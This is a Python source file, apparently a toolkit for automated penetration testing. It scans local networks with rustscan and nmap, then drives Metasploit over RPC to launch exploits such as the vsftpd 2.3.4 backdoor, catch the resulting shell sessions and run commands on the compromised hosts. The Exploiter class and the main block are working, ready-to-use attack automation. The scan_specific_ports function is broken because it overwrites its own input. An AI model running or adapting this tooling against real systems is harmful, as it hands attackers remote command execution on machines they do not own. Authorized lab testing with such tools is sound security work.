import os
import subprocess
import netifaces
import ipaddress
import re
from pymetasploit3.msfrpc import MsfRpcClient
from dotenv import load_dotenv
import time

def get_network_ips():
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            ipv4 = addrs[netifaces.AF_INET][0]
            ip = ipv4['addr']
            mask = ipv4['netmask']
            try:
                network = ipaddress.ip_network(f"{ip}/{mask}", strict=False)
                return list(network.hosts())
            except ValueError:
                continue

class Scanner:
    def __init__(self):
        pass
    
    def scan_entire_network(self):
        for iface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                ipv4 = addrs[netifaces.AF_INET][0]
                ip = ipv4['addr']
                mask = ipv4['netmask']
                try:
                    network = ipaddress.ip_network(f"{ip}/{mask}", strict=False)
                    ip_obj = ipaddress.ip_address(ip)
                    
                    # Skip loopback (127.0.0.0/8) and link-local (169.254.0.0/16) addresses
                    if ip_obj.is_loopback or ip_obj.is_link_local:
                        continue
                    
                    print("Network being scanned: ", network)
                    result = subprocess.run(["rustscan", "-a", str(network)], capture_output=True, text=True)
                    return result.stdout if result.stdout else result.stderr
                except ValueError:
                    continue
        return "No valid network interface found"

    def get_ip_of_website(self, website):
        # Remove protocol (http://, https://) and path/query parameters
        clean_url = re.sub(r'^https?://', '', website)
        clean_url = re.sub(r'/.*$', '', clean_url)
        
        result = subprocess.run(["dig", "+short", clean_url], capture_output=True, text=True)
        if(result.stdout):
            return result.stdout
        else:
            return result.stderr
        
    def scan_target(self, ip_address):
        result = subprocess.run(["rustscan", "-a", ip_address], capture_output=True, text=True)
        if(result.stdout):
            return result.stdout
        else:
            return result.stderr
    
    def scan_specific_port(self, ip_address, port):
        result = subprocess.run(["rustscan", "-a", ip_address, "-p", port, "--", "-sV", "-sC"], capture_output=True, text=True)
        if(result.stdout):
            return result.stdout
        else:
            return result.stderr
    
    def scan_specific_ports(self, ip_address, ports):
        ports = ""
        for port in ports:
            ports += f"{port},"
        result = subprocess.run(["rustscan", "-a", ip_address, "-p", ports, "--", "-sV", "-sC"], capture_output=True, text=True)
        if(result.stdout):
            return result.stdout
        else:
            return result.stderr
        
    def get_running_services(self, ip_address):
        result = subprocess.run(["nmap", "-sV", ip_address], capture_output=True, text=True)
        if(result.stdout):
            return result.stdout
        else:
            return result.stderr

class Exploiter:
    def __init__(self, msf_client=None):
        if msf_client is None:
            raise ValueError("MsfRpcClient instance must be provided to Exploiter")
        self.client = msf_client
    
    def find_vulnerabilities_for_service(self, service_name):
        available_exploits = []
        for exploit in self.client.modules.exploits:
            if service_name.lower() in exploit:
                available_exploits.append(exploit)
        return available_exploits
    
    def run_exploit(self, exploit_name, target_ip, options):
        """
        Run a Metasploit exploit against a target
        
        Args:
            exploit_name: Full path to the exploit (e.g., 'unix/ftp/vsftpd_234_backdoor')
            target_ip: Target IP address
            options: Dictionary of additional options for the exploit
        
        Returns:
            Dictionary with execution results and session info
        """
        try:
            # Get current sessions before exploit
            sessions_before = set(self.get_sessions().keys())
            
            # Load the exploit module
            exploit = self.client.modules.use('exploit', exploit_name)
            
            # Set target
            exploit['RHOSTS'] = target_ip
            
            # Set additional options (skip payload and LHOST/LPORT as they're handled separately)
            for option, value in options.items():
                if option not in ['payload', 'LHOST', 'LPORT']:
                    exploit[option] = value
            
            # Check if exploit requires a payload
            if 'payload' in options:
                payload_name = options['payload']
            else:
                # Default payload
                payload_name = 'cmd/unix/interact'
            
            payload = self.client.modules.use('payload', payload_name)
            
            # Set payload options if provided
            if 'LHOST' in options:
                payload['LHOST'] = options['LHOST']
            if 'LPORT' in options:
                payload['LPORT'] = options['LPORT']
            
            # Execute the exploit
            result = exploit.execute(payload=payload)
            
            # Wait for session to establish (exploits are async)
            session_id = None
            max_wait = 10  # Wait up to 10 seconds
            wait_interval = 0.5  # Check every 0.5 seconds
            
            for i in range(int(max_wait / wait_interval)):
                time.sleep(wait_interval)
                sessions_after = set(self.get_sessions().keys())
                new_sessions = sessions_after - sessions_before
                
                if new_sessions:
                    # New session(s) created
                    session_id = max(new_sessions)  # Get the newest session
                    break
            
            if session_id:
                # Get session details
                sessions = self.get_sessions()
                session_info = sessions.get(session_id, {})
                return {
                    'success': True,
                    'exploit': exploit_name,
                    'target': target_ip,
                    'result': result,
                    'session_id': session_id,
                    'session_info': session_info,
                    'message': f'Exploit successful! Session {session_id} created on {target_ip}'
                }
            else:
                return {
                    'success': True,
                    'exploit': exploit_name,
                    'target': target_ip,
                    'result': result,
                    'session_id': None,
                    'message': f'Exploit launched (job_id: {result.get("job_id", "N/A")}), but no session created after {max_wait}s. Target may not be vulnerable or network issues exist. Check: 1) Target runs vsftpd 2.3.4 with backdoor, 2) Port 21 is open, 3) No firewall blocking.'
                }
        
        except Exception as e:
            return {
                'success': False,
                'exploit': exploit_name,
                'target': target_ip,
                'error': str(e),
                'message': f'Exploit execution failed: {str(e)}'
            }
    
    def get_sessions(self):
        """
        Get all active sessions
        
        Returns:
            Dictionary of active sessions with their details
        """
        try:
            sessions = self.client.sessions.list
            return sessions
        except Exception as e:
            return {}
    
    def execute_command(self, session_id, command):
        """
        Execute a command on a specific session
        
        Args:
            session_id: The session ID to execute the command on
            command: The command to execute
        
        Returns:
            Dictionary with command output
        """
        try:
            session = self.client.sessions.session(str(session_id))
            
            # Write the command
            session.write(command)
            
            # Read the output (wait a bit for command to execute)
            import time
            time.sleep(1)
            output = session.read()
            
            return {
                'success': True,
                'session_id': session_id,
                'command': command,
                'output': output,
                'message': 'Command executed successfully'
            }
        except Exception as e:
            return {
                'success': False,
                'session_id': session_id,
                'command': command,
                'error': str(e),
                'message': f'Command execution failed: {str(e)}'
            }
    
    def stop_session(self, session_id):
        """
        Stop/kill a specific session
        
        Args:
            session_id: The session ID to stop
        
        Returns:
            Dictionary with result
        """
        try:
            self.client.sessions.stop(str(session_id))
            return {
                'success': True,
                'session_id': session_id,
                'message': f'Session {session_id} stopped successfully'
            }
        except Exception as e:
            return {
                'success': False,
                'session_id': session_id,
                'error': str(e),
                'message': f'Failed to stop session: {str(e)}'
            }

if __name__ == "__main__":
    load_dotenv()
    
    # Kill any existing msfrpcd processes
    os.system("pkill -9 -f msfrpcd")
    import time
    time.sleep(1)
    
    # Start msfrpcd
    password = os.getenv("MSF_RPC_PASSWORD")
    port = os.getenv("MSF_RPC_PORT", "55552")
    cmd = f"msfrpcd -P {password} -p {port} -a 127.0.0.1"
    ret = os.system(cmd)
    if ret == 0:
        print("msfrpcd started successfully")
    else:
        print(f"msfrpcd exited with code {ret}")
    
    time.sleep(3)
    
    # Initialize MsfRpcClient and Exploiter
    msf_client = MsfRpcClient(password, port=int(port), ssl=True)
    exploiter = Exploiter(msf_client)
    
    # Test
    scanner = Scanner()
    print(scanner.scan_specific_port("192.168.64.2", "3306"))
    print(exploiter.find_vulnerabilities_for_service("vsftpd"))